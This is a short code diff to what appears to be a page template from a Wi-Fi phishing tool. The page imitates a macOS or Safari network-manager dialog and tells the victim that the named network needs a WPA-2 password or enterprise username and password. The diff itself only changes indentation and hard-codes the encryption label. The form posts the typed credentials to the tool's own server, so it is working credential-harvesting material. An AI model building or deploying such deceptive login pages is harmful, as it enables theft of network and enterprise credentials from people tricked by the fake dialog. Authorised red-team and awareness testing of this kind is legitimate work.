@@ -195,8 +195,8 @@
 	            document.write("<link rel='stylesheet' href='/static/mac-network-manager-Firefox.css' />");
 		}
 		else {
-	    	document.write("<link rel='stylesheet' href='/static/safari-offline.css' />");
-            	document.write("<link rel='stylesheet' href='/static/mac-network-manager-Safari.css' />");
+	    	    document.write("<link rel='stylesheet' href='/static/safari-offline.css' />");
+            	    document.write("<link rel='stylesheet' href='/static/mac-network-manager-Safari.css' />");
 		}
 	}
 	
@@ -220,7 +220,7 @@
 	'                <img src="/static/question.png" alt="?" width="25" class="question" />' +
 	'                <div class="description">' +
 	'                   <form id="wifi-search-form" method="post" action="/post">' +
-	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
+	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a WPA-2 password.</strong>' + 
 	'                       <div class="password">' +
 	'                           <label>Password: </label>' +
 	'                           <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
@@ -256,7 +256,7 @@
 	'                <img src="/static/question.png" alt="?" width="25" class="question" />' +
 	'                <div class="description">' +
 	'                   <form id="wifi-search-form" method="post" action="/post">' +
-	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires {{ target_ap_encryption }} enterprise credentials.</strong>' + 
+	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires WPA-2 enterprise credentials.</strong>' + 
 	'                       <div class="username">' +
 	'			    <label>Username: </label>' +
 	'			    <input type="text" id="wifi-search-username" name="wfphshr-wpa-username"/>' +
